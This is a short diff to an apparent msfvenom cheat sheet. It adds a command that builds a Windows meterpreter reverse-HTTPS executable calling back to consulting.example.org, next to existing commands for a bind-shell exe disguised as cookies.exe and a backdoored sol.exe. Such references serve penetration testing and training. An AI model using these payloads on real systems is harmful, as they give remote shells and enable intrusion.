@@ -17,6 +17,7 @@ The advantages of msfvenom are:
 - msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messageBox
 - msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
 - msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
+- msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=consulting.example.org LPORT=4443 > metasploit_https.exe
 
 =======
  OS X
